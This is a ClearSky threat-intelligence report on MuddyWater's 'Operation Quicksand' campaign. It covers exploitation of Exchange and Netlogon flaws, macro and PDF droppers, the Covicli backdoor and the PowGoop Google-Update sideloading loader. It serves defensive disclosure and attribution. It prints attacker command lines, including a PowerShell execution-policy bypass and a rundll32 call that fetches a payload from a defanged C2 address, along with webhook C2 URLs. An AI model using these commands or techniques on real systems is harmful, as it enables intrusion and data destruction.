MuddyWater was previously exposed as a contractor for the IRGC\n(Islamic Republic Guard Corps)[1].\n\nClearSky and Profero comprehensively researched this campaign. During the campaign, the group\n\nattempted to install a variant of the “PowGoop”, a malicious replacement to Google update dll. Based\non PaloAlto report[2], “PowGoop” is a loader for a variant of Thanos ransomware with destructive\ncapabilities.\n\nWe assess that the group is attempting to employ destructive attacks (the likes of the NotPetya attack\nfrom 2017), via a disguised as ransomware attacks. Although we didn’t see execution of the destruction\nin the wild, due to the presence of the destructive capabilities, the attribution to nation-state\nsponsored threat actor, and the realization of this vector in the past, a destructive purpose is more\nlikely than a ransomware that is being deployed for financial goals.\n\nOn September 4[th], PaloAlto published a report about this destructive variant of Thanos ransomware\nwithout attributing it to any known threat actor. However, the organizations that were targeted in the\ncampaign were state-run organizations in the Middle East and North Africa. The loader of this variant\ndubbed ‘PowGoop’, is a fake Google Update mechanism and was attributed to MuddyWater based on\n\ncode similarities with the MoriAgent / PudPoul dll loader.\n\nIn our analysis, we identified two primary attack vectors:\n\n  - The first vector entailed sending a malicious decoy document (PDF or Excel) that\ncommunicates over OpenSSL with a malicious C2 server and downloads files, which later\ndeploy the “PowGoop” payload.\n\n  - The second vector involves exploiting CVE-2020-0688 and deploying the same payload via aspx\n\nfile (WebShell). The attacker will create an internal socket tunneling between compromised\nmachines in the network. The attacker used a modified SSF (Socket) for it. Then, the attacker\n\ndownloads the PowGoop as well. Recently, Microsoft revealed that MuddyWater had been\n\nleveraging the ZeroLogon vulnerability as well (CVE-2020-1472)[3].\n\nThis is not the first time that Iranian threat actors use wipers as part of their TTPs. The threat actor\nAPT33 used wipers in at least three different attacks, the most notorious of them being the Shamoon\n\nattack. In contrast to APT33, MuddyWater is known for their social engineering campaigns.

In ‘Operation\nQuicksand’ we uncovered the first known instance of a potentially destructive attack executed by\nMuddyWater, focusing on prominent organizations in Israel and in other countries around the world.\n\nWe identified a repetitive PDB path in the networks that were researched containing the word ‘Covic’.\n\nThis may indicate a covid-19 inspiration and suggests the possible dates in which MuddyWater might\nhave developed the malware.\n\n###### Iranian-Related Destructive Campaigns \n\nDestructive campaigns were engaged by Iranian threat actors in the past, particularly targeting the\n\nArabian Peninsula. However, destructive attacks of this scale have only been observed once prior to\n\nthe current event, and the perpetrator was not MuddyWater.\n\nIn 2012, a threat actor based in Iran used Shamoon wiper in their attacks against Aramco, the oil and\ngas company from Saudi Arabia[4]. In 2016-2018, two more variants of Shamoon were exposed[5]. These\nattacks were previously attributed to APT33 (Elfin) by FireEye[6] and McAfee[7]. In 2019-2020, a couple new\nwipers – ZeroCleare[8] and Dustman[9], were exposed in 2 operations against entities in the Arabian\nPeninsula. Dustman and ZeroCleare were both attributed to APT33 and APT34.\n\nIn May 2020, Fox News reported on an offensive CNA (Cyber Network Attack) executed by Iran which\ntargeted Israel's Water and Sewage Systems[10]. The Israeli national cyber authority did not confirm that\nIran was behind this attack.\n\nDespite previous instances of Iranian threat actors using wipers, an attempt to camouflage the wiper\n\nas a ransomware was not yet reported.\n\n###### Attack Vector – Wiper Disguised as Ransomware\n\nThe ransomware Petya surfaced in 2016[11], targeting Microsoft Windows-based systems. It was one of\nthe largest documented ransomware attacks. Not long after, a similar ransomware was observed\nattacking primarily Ukrainian entities, amongst other targets.\n\nThis malware was designed to resemble a ransomware, while its real purpose is to damage the\n\nnetwork. Files were encrypted, but the malware was modified so that it could not revert and decrypt\n\nthe files. The NotPetya attack was attributed to the Sandworm group (also known as Voodoo Bear and\n\nIron Viking) – a threat actor based in Russia.\n\n4 https://www.bbc.com/news/technology-19293797\n5 [https://unit42.paloaltonetworks.com/unit42-shamoon-2-return-disttrack-wiper/](https://unit42.paloaltonetworks.com/unit42-shamoon-2-return-disttrack-wiper/)\nhttps://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/\n6 [https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html](https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html)\n7 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/shamoon-attackers-employ-new-tool-kit-to-wipe-infected-systems/\n8 https://www.ibm.com/downloads/cas/OAJ4VZNJ\n9 https://www.zdnet.com/article/new-iranian-data-wiper-malware-hits-bapco-bahrains-national-oil-company/\n10 https://www.foxnews.com/world/iran-picks-cyber-fight-with-israel-as-both-sides-target-critical-infrastructure\n11 https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crashed-the-world/\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n4 | P a g e\n\n\n-----\n\nThe attack vector in Operation Quicksand is almost identical.

The tools and techniques used by the group may be\n\ndivided into several groups:\n\n1. Techniques\n\na. Exploitation – In this operation MuddyWater used Exploitation techniques for two\n\nmain 1-day vulnerabilities:\n\ni. CVE-2020-1472 - An elevation of privilege vulnerability that exists when an attacker\n\nestablishes a vulnerable Netlogon secure channel connection to a domain controller,\n\nusing the Netlogon Remote Protocol (MS-NRPC), aka 'Netlogon Elevation of Privilege\n\nVulnerability'[13].\n\nii. CVE-2020-0688 - A remote code execution vulnerability which exists in Microsoft\n\nExchange software when the software fails to properly handle objects in memory, aka\n\n'Microsoft Exchange Memory Corruption Vulnerability'[14].\n\nb. Macro       - A malicious macro embedded in an excel file. The malicious piece of code\n\ninstalls three files used in the first stage of the infection.\n\nc. PowerShell code – during the injection phase, a malicious file will be dropped to the\n\nvictim’s network, containing a PowerShell code.\n\nd. VBA code – A malicious VBS code is used through the injection phase, similar to the\n\nPowerShell code.\n\ne. Account theft – the attacker compromised Domain Administration accounts, which\n\nwill be used in DCSync attack.\n\n2. Self-developed tools – tools ingeniously created for this campaign. We have identified several\n\nsuch tools used in this campaign, most of them files intended to infect the target computer.\n\nMost of these are legitimate files that were modified by MuddyWater. Following is a categorized\n\nlist of those tools:\n\na. Injection tools:\n\ni. PDF-based dropper – similarly to the implementation of a malicious Macro in\n\nexcel files, MuddyWater used a PDF file as their decoy document. The PDF was\ninjected with malicious code, deploying files to the system. The deployed files\nare used in the second stage of the attack.\n\n13 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472\n14 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0688\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n6 | P a g e\n\n\n-----\n\nb. Offensive tools:\n\ni. WebShell – the attacker installed an ASP.NET WebShell named\n\nIndexEchangeManagment.aspx. This WebShell drops the SSF.MX backdoor\nlater in the process.\n\nii. Covicli backdoor – after the decoy file is run in the system, the attacker uses a\n\nmodified SSLeay32 dynamic library designated as a backdoor. The dynamic\n\nlibrary allows the attacker to communicate with the C2 over openSSL. We call\n\nthis backdoor “Covicli” due to its PDB paths – Covic\\modules\\cli.pdb.\n\niii. SSF.mx – after the exploitation phase, the attacker will use WebShell to drop\n\nan exe file enabling them to communicate between two compromised\n\nmachines in the network (Lan to DMZ for example ) Socket proxy. Since it is\ninstalled on the exchange server, we regard it as a backdoor. Note that this\nfilename (SSF.exe) was previously reported in a SecureWorks report[15]. The\noriginal source-code can be found on GitHub[16], while the file we detected in\nthe network was a modified variant of the original SSF.\n\niv. PowGoop Loader – PowGoop is a loader that was exposed in a PaloAlto report\n\nand later used in Operation Quicksand. PowGoop is comprised of a DLL\nLoader and a PowerShell-based downloader. The malicious file impersonates\na legitimate goopdate.dll file that is signed as a Google Update executable.\n\n###### Tools and Offensive Techniques Categorized with MITRE ATT&CK\n\nThe different tools and techniques used by the group are divided in the following table according to\ntheir Kill Chain Method. In this comprehensive research, we identified 2 attack vector types – exploitbased (which will be mentioned as type A) and social engineering-based (which will be mentioned as\ntype B). Following is the mentioned division by type:\n\n   - Type A: Reconnaissance > Weaponization > Exploitation > Installation > Command and\n\nControl > Actions on Objectives\n\n   - Type B: Weaponization > Delivery > Installation > Command and Control > Actions on\n\nObjectives.\n\nAs observable, the chains are almost identical. However, the major difference between the attack\n\nvectors is the injection method.\n\nThe following table shows the overlaps between the tools and techniques that we have found in the\n\noperation, dividing them according to attack vector – social engineering (type a) and vulnerability\nexploitation (type b).\n\n15 https://www.secureworks.com/blog/business-as-usual-for-iranian-operations-despite-increased-tensions\n16 https://github.com/securesocketfunneling/ssf\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n7 | P a g e\n\n\n-----\n\n|Attack Vector Kill Chain Phase Techniques, Tools Title MITRE ATT&CK type and Procedures|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|A|Reconnaissance|Techniques|Domain Administrator account hunting|Account Manipulation - T1098 OS Credential Dumping: DCSync - T1003.006|\n|B|Weaponization|Tools|Covicli backdoor – modified CLI.dll file, allows the attacker to communicate with a C2 over SSL|Remote Services – T1021 Scripting - T1064 Hijack Execution Flow: DLL Search Order Hijacking – T1574.001|\n|A||Tools|SSF.mx backdoor – modified SSF.exe file, allows the attacker to communicate between two machines in the network (that were already compromised)|Remote Services – T1021 Scripting - T1064 Hijack Execution Flow: DLL Search Order Hijacking – T1574.001|\n|B|Delivery|Techniques|Sending an email carrying a decoy file|Conduct social engineering - T1268 Obfuscated Files or Information - T1027|\n|A|Exploitation|Techniques|CVE-2020-1472 CVE-2020-0688|External Remote Services - T1133|\n|B|Installation|Tools|Visual Basic Macro code – Embedded in excel|Scripting - T1064 User Execution: Malicious File – T1204.002|\n|B||Tools|PowerShell code|Command and Scripting Interpreter: PowerShell T1059.001 PowerShell – T1086|\n|B||Tools|Malicious PDF (dropping files)|User Execution: Malicious File – T1204.002 Exploitation for Client Execution – T1203|\n|A||Techniques|External Webshell over the internet|Web Shell – T1100 Remote Services – T1021|\n|A+B||Procedures|Modify Registry keys|Modify Registry - T1112|\n|A||Procedures|Archives (WinRAR or 7-ZIP)|Data Compressed – T1002|\n|A|Command & Control (C2)|Techniques|Socket|Uncommonly Used Port - T1065|\n|B||Techniques|Communication with C2 over SSL and TCP (Port 80)|Web Service – T1102 Signed Binary Proxy Execution: Rundll32 – T1218.011|\n|A + B|Actions on Objectives|Procedures|Scheduled Task|Scheduled Task/Job - T1053|\n|A + B||Tools|PowGoop Loader|Ingress Tool Transfer – T1105 User Execution: Malicious File – T1204.002|\n|A + B||Procedures|Distribution in the network|Exploitation of Remote Services – T1210|\n|A + B||Techniques|Data Encryption|Data Encrypted for Impact – T1486|\n\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n8 | P a g e\n\n\n-----\n\n##### Modus Operandi\n\n###### Introduction\n\nAn attack campaign waged against prominent Israeli organizations was revealed during the first week\n\nof September through our monitoring system. We identified many resemblances in TTPs with previous\n\nattacks, attributing the current campaign to MuddyWater accordingly.\n\nDuring our analysis, we were able to identify PowGoop’s payload in several organizations, with\n\nsimilarities to TTPs reported in PaloAlto report.\n\nThe first attack vector included exploiting vulnerabilities in the victim’s network, installing relevant\n\ntools that enable the attacker to gain persistency, and downloading the PowGoop payload.\n\nThe second attack vector is more “common” and includes social engineering methods and a malicious\nMacro in its infection phase.\n\nIn this chapter, we will present a summary of the two attack vectors used by the group. Both infection\nvectors will be covered (and will be divided based on the tools, techniques, or procedures the attacker\nuse), followed by the installation of PowGoop, which was exposed as the loader of Thanos.\n\n###### Exploit-based Vector (Vector A)\n\n Exploitation\n\nThe first attack vector entails exploiting known vulnerabilities in OWA, Microsoft Exchange servers or\nusing ZeroLogon Windows vulnerabilities. These are followed by vulnerabilities with different access\nsystems that were used by the attackers:\n\n\nCVE-2020-0688 Microsoft Exchange vulnerability\n\n\nA remote code execution vulnerability exists in Microsoft Exchange software when the software fails to\n\nproperly handle objects in memory, aka the 'Microsoft Exchange Memory Corruption Vulnerability'[17].\nThe exploitation provides the attacker SYSTEM level code execution privileges.\n\n\nCVE-2020-1472 Netlogon Remote Protocol (MS-NRPC) vulnerability\n\n\nAn elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure\n\nchannel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC), aka\n\n'Netlogon Elevation of Privilege Vulnerability'.\n\n###### Installation\n\n\nInstalling a WebShell\n\n\nAfter exploiting the vulnerability in the exchange server, a WebShell will be uploaded to the\n\ncompromised server. During our IR investigation, we identified a WebShell named ‘LiveIdError.aspx’\n\n17 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0688\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n9 | P a g e\n\n\n-----\n\nwhich indicates this specific vulnerability. Note that this is the only known vulnerability through which\nthis WebShell is dropped.\n\nThis WebShell was used to download another ASP.NET WebShell as a payload. The second WebShell\nis named ‘IndexExchangeManagment.aspx’ (Note the misspelled ‘management’ word):\n\nThe attacker required privileged credentials to successfully execute the exploitation. We assess that\nthe attacker stole these credentials by deploying Mimikatz.\n\nMoreover, we identified a GitHub profile with the explanation of the execution of the vulnerability. This\n\nprofile is also based in Iran[ 18].\n\n\nSSF.mx - Malware\n\n\nUsing this WebShell, a zip file is dropped to the victim’s network. The file archived in the zip is a portable\nexecutable file named SSF.exe. This file was also reported in SecureWorks’ report as one of the\npayloads MuddyWater installs in compromised servers[19]. This tool is based on a publicly available\n\nopen-source toolkit[20] that enables Secure Socket Funneling (SSF) between the C2 and the remote\ncompromised server or between two machines that were compromised in the victim’s network. The\ntool allows the attacker to send data from multiple sockets over TCP or UDP ports through a single\nsecure TLS tunnel.\n\nIn our analysis, we found out that SSF.mx is a variant of the SSF tool from GitHub. This variant also\n\nallows the attacker to execute shell commands across the network (for lateral movement or between\ninternal machines that were encrypted).\n\nNote that after the installation of PowGoop loader, we identified attempts to delete SSF.mx files from\nthe network.\n\n###### Command and Control\n\nAfter gaining access to the victim’s network, the attacker started conducting reconnaissance. We\n\nidentified queries for Domain Administrator accounts and enumeration attempts for specific domains\n\nin the network.\n\nUsing the SSF.mx secure tunnel, the attacker spread the PowerShell scripts and executes them. We\nidentified the distribution of the PowGoop loader to the system.\n\nA scheduled task is also generated by the attacker. This task would take part in running GoopDate.dll\n\n(PowGoop).\n\n18 https://github.com/mahyarx/Exploit_CVE-2020-0688\n19 https://www.secureworks.com/blog/business-as-usual-for-iranian-operations-despite-increased-tensions\n20 https://github.com/securesocketfunneling/ssf\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n10 | P a g e\n\n\n-----\n\n###### Social Engineering-Based Vector (Vector B)\n\n Delivery\n\nThe second vector is more in line with common MuddyWater vectors. As mentioned, there is a\n\npossibility that Vector A was utilized only after initial access was obtained using Vector B.\n\nIn the beginning of the delivery stage, the target receives a link to their corporate email, joined by a link\nto a file storing service. Through this service the victim encounters a ZIP containing the infected file[21]:\n\nThe ZIP contains one of two types of file:\n\n  - An Excel file containing a malicious macro which communicates with the C2 server, typically\na breached server controlled by the attackers.\n\n  - A PDF file that drops a malicious dll file to the victim’s network. This is a relatively new vector\nfor MuddyWater.\n\n###### Installation\n\n\nVisual Basic Macro code – Embeddedin excel\n\n\nA screenshot of the excel file:\n\n21 The screenshots were published by the Israeli CERT\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n11 | P a g e\n\n\n-----\n\nFrom the malicious macro embedded in the excel file we can derive that the file used in the attack\nwas previously a test file. The macro is divided into different parts:\n\nEach part of code is encoded in different ways, including ASCII, XOR, and base64. Following is the code\nbefore decoding and decrypting:\n\nAfter combining and decoding all the parts, the excel is run a second time through a COM component\n\n(taskschd.dll) in the background:\n\n\"C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE\" /automation -Embedding\"\n\nWith this component, 2 pieces of PowerShell code are downloaded to the computer. After that, a\n\nScheduled Task is automatically run, to activate WScript:\n\nThis PowerShell code communicates with a breached server from which the group downloads\n\nmalicious files used as the malware’s “Stage 2”. The second server is a C2 server used as storage for\n\nadditional files, not necessarily breached.\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n12 | P a g e\n\n\n-----\n\nThe communication in this instance is carried out through a file named dl which contains PowerShell\n\ncommands. Following is the command that allows running this file (can also be seen in the code):\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -file\nC:\\users\\public\\dl.ps1\n\nCommunications to the server are carried out with GET commands in TCP format (under port 443).\nFollowing is the specific command to download the file:\n\n$url = 'hxxps://webmail.lax.co[.]il/owa/auth/Current/Script/jquery-3.5.1.min.js\n\nA VBS file called db.vbs is downloaded from the server and stored in the Public folder. The\naforementioned file is an additional PowerShell command, which extracts a third ps1 file. This file,\n\ncalled putty.ps1, allows for communication between the second C2 server in this infrastructure and the\ninfected machine, as preparation for the downloading of the malware to the machine.\n\nThe aforementioned C2 server is a webhook (Reverse API), from which the attackers download a\n\nspecific file stored at the site. Following are three additional webhooks (aside from the webhook in the\nscreenshot), which we have identified throughout the investigation:\n\nhxxps://webhook[.]site/7c1564f7-4e3c-4082-b1f8-3b52da3d9941\n\nhxxps://webhook[.]site/861f0c6f-238a-4878-8e44-0ca078ad9b2c\n\nhxxps://webhook[.]site/f4c2dba3-bdba-44a3-b8b8-f292b6fb8a7b\n\nThe Covicli backdoor will be downloaded from this webhook to the victim’s compromised server.\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n13 | P a g e\n\n\n-----\n\nMalicious PDF (dropper)\n\n\nSimilar to the Excel vector, an archive file (mainly ZIP) was sent to an employ of the organization we\ninvestigated. The file accordingly is in Hebrew, and is about a loan. Here is a screenshot of the PDF file:\n\nSimilarly, to files used in previous campaigns, once the malicious executable is running, two files are\nunloaded to the machine: a legitimate PDF and a malicious DLL. It appears that the attackers have\n\nadvanced their security system avoidance techniques, implementing several camouflaging\ncomponents such as ones designed to refrain from triggering Windows Defender. The attackers\nmanage to bypass many identification systems, making technical investigations much more difficult.\n\nAdditionally, the use of Hewlett-Packard MFP was identified, in place of the NSIS executable.\n\nIn the meantime, another folder will be created in the path:\n\nC:\\users\\<username>\\AppData\\Local\\\n\nTo gain persistency, the malicious file will be copied to the %temp% folder followed by its deletion\n\nfrom the original folder. Another file will be copied to the Startup folder with a PDF’s icon. The attacker\nwill also create a scheduled task for a PowerShell that runs a file named xca_db_stat.exe.\n\nThen, the attacker will create 2 registry keys on the following path:\n\n\\HKEY_CURRENT_USER\\Software\\Electrum\n\nHere is a table presenting the new values:\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n14 | P a g e\n\n\n-----\n\n|Value Name|Details|\n|---|---|\n|Elec|Base64 string that contains data for communication with the C2: - IP of the C2 - ID - Key - Cookie|\n|Scan|Text string|\n\n\nCovicli Backdoor\n\n\nFrom the C2, a dll file named SSLeay32.dll will be downloaded. This file is a modified OpenSSL dynamic\n\nlibrary, which was modified for the hacker’s purposes. We identified the following PDB path:\n\nG:\\Project\\Covic\\Modules\\CLI.dll\n\nDue to the appearance of the word Covic, and the original name given to the file (CLI.dll) by the threat\nactor, we named this backdoor Covicli. This file also contains a module version ID of .net4:\n\n###### Command and Control\n\nThe attacker uses the following command line in order to communicate with the C2 over OpenSSL:\n\nRundll32.exe C:\\ProgramData\\RozellaBobine\\ssleay32.dll, DllRegisterServer\nhxxp://185.183.96[.]61:80/downloadc.php?key=WKXKgRkJsT\n\nThis server’s Header displays the server’s location as if it is associated with the Azerbaijani government.\nThe result of this is diverging access to the server through port 80 but without the path to the following\nsite:\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n15 | P a g e\n\n\n-----\n\nThe malware itself generates a scheduled task named Updater (expanded further on) that\ncommunicates with the server using PowerShell (on port 80), much like MoriAgent.

After\n\nthe installation, the attacker tried to delete SSF.mx task from the network by using the following\n\ncommand:\n\nIn our research, we found five components of PowGoop array:\n\n  - GoogleUpdate.exe - Legitimate signed binary\n\n  - goopdate86.dll - Legitimate DLL, vulnerable to a DLL sideloading attack.\n\n  - goopdate.dll - First loader of PowGoop.\n\n  - goopdate.dat - Second loader of PowGoop. Obfuscated on disk. Decodes PowerShell\ndownloader component\n\n  - config.txt - Encoded PowerShell downloader\n\nThis is a slightly different variant originally found in the report by Palo Alto (which reported about 4\ncomponents). The loader from PaloAlto report was split into two components. The second loader\nfound in this attack matches the functionality of the only loader described in Palo Alto’s report. This\nsuggests it was used as a technique by the attacker to obfuscate part of the loader that was detected\n\nby antivirus scanners.\n\nThe GoogleUpdate.exe used with the malware is a legitimate binary, but it is vulnerable to a DLLsideloading attack. One of Google Update’s dependencies is a DLL named goopdate86.dll which then\n\nhas a dependency of goopdate.dll. The malware works by replacing the original goopdate.dll by a\nmalicious DLL containing the same filename. By replacing the legitimate goopdate.dll with a malicious\none, GoogleUpdater.exe ends up loading the malicious payload into memory.\n\nThe PowGoop malware works as follows:\n\n  - GoogleUpdate.exe (legitimate binary) loads legitimate goopdate86.dll into memory.\n\n  - goopdate86.dll loads the malicious goopdate.dll into memory (side-loading).\n\n  - Malicious goopdate.dll launches rundll32.exe with the parameter DllRegisterServer.\n\n  - The export DllRegisterServer from the malicious goopdate.dll gets run, which loads the\nsecond, obfuscated loader goopdate.dat, into memory.\n\n  - The script embedded in the second loader then decodes config.txt, revealing another\nPowerShell script once decoded, and then executing the now decoded script.\n\n  - The encoded script then connects to an C2 and acts as a downloader waiting for new\n\npayloads.\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n17 | P a g e\n\n\n-----\n\nFollowing a screenshot from our investigation, presents the execution of PowGoop in the machine, and\nthe PowerShell script that was extracted from[22].\n\nUnlike the .dat file in PaloAlto report, in this case the loader used goopdate.dat file:\n\nNote that this file shares the same PDB path with the Covicli backdoor:\n\nG:\\Project\\Covic\\Modules\\goopdate.pdb\n\nIn both cases, the PowGoop loader payload was downloaded from the C2 (which we attributed to\nMuddyWater based on unique server signature).

Over the past few years, we have uncovered a number of “social engineering” attack scenarios\n\nconducted by the group. campaigns by the group have targeted individuals, companies, organizations,\n\nand governments. We also identified attacks by the group targeting internal Iranian actors.\n\nThe group’s campaigns may be categorized to three distinct periods and attack scenarios (ordered\n\nchronologically):\n\n1. Initial Wave of Attacks – “PowerStats” era – this attack TTP was using Office documents as\n\nan entry vector, Word documents at first, then transferring to Excel files two years later.\n\nThese documents were used to activate malicious macros that communicate with a\nhacked C2, download PowerShell codes, connect to an additional server, and finally to\ninstall the PowerStats RAT. “PowerStats” named after another group’s moniker\n“StaticKitten”.\n\n2. Second Wave – DNS Tunneling - During this period, the group used the same Office\ndocuments, only instead of connecting to a hacked server the group performed DNS\nqueries to self-owned servers. The main tool utilized by the group is a DLL named\nForeLord, constituting a RAT. Some of the domains addressed by the group were\nregistered such that they impersonate security companies, for example Trend Micro,\nKaspersky, and ClearSky itself.\n\n3. Third Wave – PudPoul/MoriAgent – during the past few months we have located a new\nattack campaign by the group, characterized by generating executables that unload two\n\nmain files to the machine: a legitimate PDF and a malicious DLL named MoriAgent. As the\ninvestigation continued a MoriAgent variant was uncovered, named PudPoul after the file\npudding.dll. This attack scenario is the most recent and up to date regarding the group. It\nis worth noting that throughout this campaign we have only identified the installation of\n\nthe tool on the target network, but no direct application of said tool towards any specific\n\naim. This differs from the PowerStats and DNS tunneling periods, and as such prevents\n\nClearSky from determining the absolute purpose of the campaign (intelligence gathering,\ndestruction, or a combination of both in the form of an intelligence gathering campaign\n\nturned destructive). A Palo Alto research regarding a destructive (wiper) malware named\n\nThanos that impersonates a ransomware during activation was published last week.\nClearSky identified many congruences with the PudPoul files, leading to a MuddyWater\n\nassociation.\n\nStill, ClearSky holds several reservations regarding the association, which should be duly considered:\n\n  - The group has acted towards intelligence gathering and espionage for the Iranian regime so\n\nfar, in place of destructive attacks.\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n19 | P a g e\n\n\n-----\n\n  - The group continues to employ attack scenarios based on social engineering.\n\n  - The Iranian APT33 does conduct destructive attacks but has yet to be linked with MuddyWater.\n\nIt is possible that due to the advancing confrontation with Israel, and simply developments of attack\n\nmethods over time, that the group had undergone an organizational\\strategic evolution (or simply\n\nreceived new instructions) into destructive attacks. During ClearSky’s investigation we have located\nseveral additional files and C2s that operate as part of the attack infrastructure.\n\nOnce the tool is deployed, keys are exchanged, and persistence on the network is established, the\n\ngroup generates communications with its C2, this apparently to install a malware that appears to be\n\nransomware. In light of the exposure of Thanos, ClearSky assesses that the group is attempting to\n\nemploy destructive attacks (the likes of the NotPetya attack from 2017).\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction**\n\n20 | P a g e\n\n\n-----\n\n##### Summary and Insights\n\nMuddyWater updated their TTPs, as well as their level of sophistication, mainly during 2020. We assess\nthat during this year MuddyWater began to work for the IRGC, acting as a contractor for additional\n\ncyber security operations. Since the group was discovered a few years ago, their priority was only CNE\n\n(espionage), against private organizations, government organizations, ministries, and agencies.\n\nThe group relied mostly on social engineering methods. For example, in late 2019 we discovered an\n\nattempt to attack a journalist that worked for a prominent US media outlet. In the first stage of the\n\nattack, MuddyWater emailed the victim without sending any file or link. The group tried to schedule a\n\nphysical meeting with the victim, and only after he made it clear that he cannot have the meeting, the\n\ngroup sent him a malicious file. Unlike this past TTP, we identified exploitation of vulnerabilities as the\n\nmajor injection vector in the current campaign.\n\nWe assess that the level of sophistication inherent to the group is high. Israel and other countries that\nare under the threat of this group have to harden their network and be prepared for more camouflaged\ndestructive campaigns. This time, the attack was prevented, and therefore we cannot prove that\nMuddyWater installed PowGoop in the victim’s network for a destructive attack. However, we adopted\nthe assessment by PaloAlto regarding the purpose of this loader.\n\nMuddyWater’s capabilities are not extremely unique, and this attack seems like an escalation of their\naggression level, rather than a completely new form of attack (as was the case in the reported Fox\nKitten attack). However, it is noteworthy that in this attack the previous infiltration into the systems of\nthe Israeli organizations was used as to gain trust and thus provide a basis for further attacks.\n\nThe tension between Israel and Iran in the cyber domain might be an explanation for this evolution.\n\nThis tension began a decade ago, with the Stuxnet malware that was attributed to Israel and the US,\nand the Iranian response. One of the retaliations of this attack was the mentioned destructive\nShamoon attack which was attributed to another Iranian threat actor – APT33. This year displayed a\nnew phase of this tension, beginning with the uncovering of the Fox Kitten operation[23] and the alleged\n\nattack by Iran against the water authority of Israel.\n\nThe retaliation for Ghasem Soleimani’s death is another possible explanation for the attack. The\n\nassassination caught Iran off-guard. On the same day, the wiper ‘Dustman’ was exposed. We assess\nthat another potential explanation for Operation Quicksand is retaliation for the assassination, and the\n\ntiming was dependent on the toolset the Iranian threat actor possessed at the time.\n\n23 https://www.clearskysec.com/fox-kitten/\n\n____________________________________________________________________________________________________\n\n**[www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020](http://www.clearskysec.com/)**\n**TLP: WHITE -
